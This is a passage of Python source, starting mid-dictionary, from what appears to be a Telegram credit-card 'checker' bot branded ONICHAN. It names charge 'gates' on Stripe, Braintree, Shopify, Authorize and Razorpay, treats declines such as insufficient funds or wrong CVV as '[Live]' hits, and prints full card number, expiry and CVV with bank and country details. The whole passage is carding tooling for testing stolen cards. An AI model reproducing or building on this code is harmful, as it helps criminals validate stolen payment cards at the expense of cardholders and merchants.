        'sor': 'Stripe $2', 'st5': 'Stripe $5', 'st12': 'Stripe $12',
        'str': 'Stripe $15', 'dep': 'Stripe $49', 'auz': 'Authorize $0',
        'asd': 'Authorize $7', 'atf': 'Authorize $25', 'anh': 'Authorize $200',
        'sh6': 'Shopify $6', 'sh8': 'Shopify $8', 'sh10': 'Shopify $10',
        'sh13': 'Shopify $13', 'bt1': 'Braintree $1', 'bt3d': 'Braintree 3D',
        'b3n': 'Braintree $5', 'rz': 'Razorpay ₹10', 'stm': 'Stripe Mass Auth',
        'se1': 'Stripe €1', 'sh': 'Shopify', 'b3': 'Braintree $3',
        'st1': 'Stripe $1', 'ast': 'Auto Stripe',
    }

    full_gate_name = gate_names.get(gate_name, gate_name.upper())

    return _onichan_format(result, cc, mm, yy, cvv, bin_info, full_gate_name, elapsed_time, username)


def _clean_response_msg(raw_msg):
    """Extract a clean short response from raw API output (handles JSON, etc.)"""
    if not raw_msg:
        return "Unknown"
    msg = str(raw_msg).strip()

    if '{' in msg and '}' in msg:
        start = msg.find('{')
        json_str = msg[start:]
        json_str = json_str.replace('False', 'false').replace('True', 'true').replace('None', 'null')
        try:
            data = json.loads(json_str)
            if isinstance(data, dict):
                if 'result' in data and isinstance(data['result'], dict):
                    inner = data['result']
                    for f in ['error', 'message', 'Message', 'response', 'status']:
                        v = inner.get(f)
                        if v and isinstance(v, str) and len(v) > 2:
                            msg = v
                            break
                elif 'Data' in data and isinstance(data['Data'], dict):
                    inner = data['Data']
                    if 'Error' in inner and isinstance(inner['Error'], dict):
                        msg = inner['Error'].get('Message', inner['Error'].get('message', msg))
                    else:
                        msg = inner.get('response', inner.get('message', msg))
                elif 'data' in data and isinstance(data['data'], dict):
                    inner = data['data']
                    if 'error' in inner and isinstance(inner['error'], dict):
                        msg = inner['error'].get('message', msg)
                    else:
                        msg = inner.get('response', inner.get('message', msg))
                else:
                    for f in ['error', 'response', 'message', 'Message', 'reason']:
                        v = data.get(f)
                        if v and isinstance(v, str) and len(v) > 2:
                            msg = v
                            break
        except:
            m = re.search(r'"(?:error|message|Message|response)"\s*:\s*"([^"]+)"', json_str)
            if m:
                msg = m.group(1)

    msg = re.sub(r'Response\s*-?\s*', '', msg).strip()
    msg = re.sub(r'<[^>]+>', '', msg)
    msg = re.sub(r'\s+', ' ', msg).strip()
    msg = msg.replace('_', ' ')
    if msg.islower():
        msg = msg.title()

    response_clean_map = {
        'succeeded': 'Approved',
        'payment method added': 'Approved',
        'card valid': 'Card Valid', 'card approved': 'Card Approved',
        'charged': 'Charged', 'authorized': 'Authorized',
        '3d secure required': '3DS Required [Live]',
        '3ds authentication required': '3DS Required [Live]',
        'insufficient funds': 'Insufficient Funds [Live]',
        'cvv incorrect': 'CVV Incorrect [Live]',
        'your card was declined': 'Declined',
        'generic_decline': 'Declined', 'generic decline': 'Declined',
        'do_not_honor': 'Do Not Honor', 'do not honor': 'Do Not Honor',
        'lost_card': 'Lost Card', 'lost card': 'Lost Card',
        'stolen_card': 'Stolen Card', 'stolen card': 'Stolen Card',
        'expired_card': 'Card Expired', 'expired card': 'Card Expired',
        'invalid_cvc': 'Invalid CVV', 'invalid cvc': 'Invalid CVV',
        'actionrequiredreceipt': '3DS Required [Live]',
        'failed': 'Declined',
    }
    ml = msg.lower()
    for pattern, clean in response_clean_map.items():
        if pattern in ml:
            msg = clean
            break

    if len(msg) > 60:
        msg = msg[:57] + "..."

    return msg


def _onichan_format(result, cc, mm, yy, cvv, bin_info, gate_display, elapsed_time, username):
    """Unified Onichan branding format for all gates — compact"""
    from config import SUPPORT_USERNAME

    card_display = f"{cc}|{mm}|{yy}|{cvv}"
    response_msg = _clean_response_msg(result.get("message", "Unknown"))
    rl = response_msg.lower()

    decline_kw = ['declined', 'error', 'failed', 'invalid', 'expired', 'denied', 'rejected', 'incorrect']
    approve_kw = ['approved', 'success', 'valid', 'charged', 'authorized', 'captured', 'paid',
                  'insufficient funds', '3d secure', '3ds required', 'cvv incorrect', 'live']
    is_declined = any(k in rl for k in decline_kw)
    is_approved = any(k in rl for k in approve_kw) and not is_declined

    if is_approved:
        status_line = "Approved ✅"
    elif result.get("status") == "error":
        status_line = "Error ⚠️"
    else:
        status_line = "Declined ❌"

    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', '')
    level = bin_info.get('level', '')
    parts_seen = {brand.upper()}
    network_parts = [brand]
    if card_type and card_type.upper() not in ('UNKNOWN', '') and card_type.upper() not in parts_seen:
        parts_seen.add(card_type.upper())
        network_parts.append(card_type)
    if level and level.upper() not in ('UNKNOWN', '') and level.upper() not in parts_seen:
        network_parts.append(level)
    network_line = " • ".join(network_parts)

    country = bin_info.get('country', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    bin_code = bin_info.get('bin', cc[:6])

    sep = "━━━━━━━━━━━━━━━━━━━━"

    return f"""💜 <b>ONICHAN • {gate_display.upper()}</b>
{sep}
💳 <code>{card_display}</code>
{sep}
📉 <b>Status</b>   : {status_line}
💬 <b>Response</b> : {response_msg}
{sep}
🔢 <b>BIN</b>      : {bin_code}
💠 <b>Network</b>  : {network_line}
🏦 <b>Bank</b>     : {bank}
🌍 <b>Country</b>  : {country}
{sep}
⏱ <b>Time</b>     : {elapsed_time:.2f}s
👤 <b>User</b>     : @{username}
⚡ <b>Powered</b>  : @{SUPPORT_USERNAME}"""
